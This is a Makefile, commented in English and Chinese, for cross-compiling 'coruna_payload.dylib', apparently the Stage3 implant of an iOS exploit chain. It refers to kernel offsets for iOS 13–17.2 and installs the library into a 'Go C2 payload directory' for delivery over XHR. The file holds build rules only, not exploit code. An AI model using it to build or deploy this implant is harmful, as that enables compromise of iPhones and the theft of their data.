# ────────────────────────────────────────────────────────────────────────────
# Coruna payload dylib — cross-compilation Makefile
#
# 当前以 iOS 17.2（Darwin 23.2.x）为主验证目标；如需在 iOS 13–16 上加载同一条 dylib，
# 把 MIN_IOS 改回 13.0 再编（内核偏移仍以 offsets.c 中 Darwin 版本匹配为准）。
#
# Requirements (macOS only):
#   • Xcode + iOS SDK  (xcode-select --install)
#   • Apple Developer account (for ad-hoc codesign on device; simulator skips)
#
# Usage:
#   make          → build coruna_payload.dylib (ARM64 iOS)
#   make install  → copy to ../bootstrap.dylib（与 Stage3 payloads/bootstrap.dylib 一致）
#   make clean    → remove build artefacts
# ────────────────────────────────────────────────────────────────────────────

CC      = clang
ARCH    = arm64
SDK     = $(shell xcrun --sdk iphoneos --show-sdk-path 2>/dev/null)
MIN_IOS = 13.0
TARGET  = coruna_payload.dylib

# All .c files are compiled as Objective-C (they use #import / @autoreleasepool)
CFLAGS = \
	-arch $(ARCH) \
	-isysroot $(SDK) \
	-miphoneos-version-min=$(MIN_IOS) \
	-x objective-c \
	-fobjc-arc \
	-Iinclude \
	-fvisibility=hidden \
	-O2 \
	-Wall

LDFLAGS = \
	-dynamiclib \
	-arch $(ARCH) \
	-isysroot $(SDK) \
	-miphoneos-version-min=$(MIN_IOS) \
	-framework Foundation \
	-framework Security \
	-framework IOSurface \
	-lsqlite3

SRC = $(wildcard src/*.c)
OBJ = $(SRC:.c=.o)

# ── Build ────────────────────────────────────────────────────────────────────
all: check_sdk $(TARGET)

check_sdk:
	@if [ -z "$(SDK)" ]; then \
	    echo "ERROR: iOS SDK not found. Run on macOS with Xcode installed."; \
	    exit 1; \
	fi
	@echo "Using iOS SDK: $(SDK)"

$(TARGET): $(OBJ)
	$(CC) $(LDFLAGS) -o $@ $^
	@echo "Built: $@"

%.o: %.c
	$(CC) $(CFLAGS) -c $< -o $@

# ── Install to Go C2 payload directory ───────────────────────────────────────
# 输出到 payloads/ios1317/bootstrap.dylib，XHR 路径 payloads/bootstrap.dylib
install: $(TARGET)
	cp $(TARGET) ../bootstrap.dylib
	@echo "Installed → ../bootstrap.dylib"

# ── Ad-hoc codesign (optional, for testing without provisioning) ──────────────
sign: $(TARGET)
	codesign --force --sign - $(TARGET)
	@echo "Ad-hoc signed: $(TARGET)"

clean:
	rm -f $(OBJ) $(TARGET)
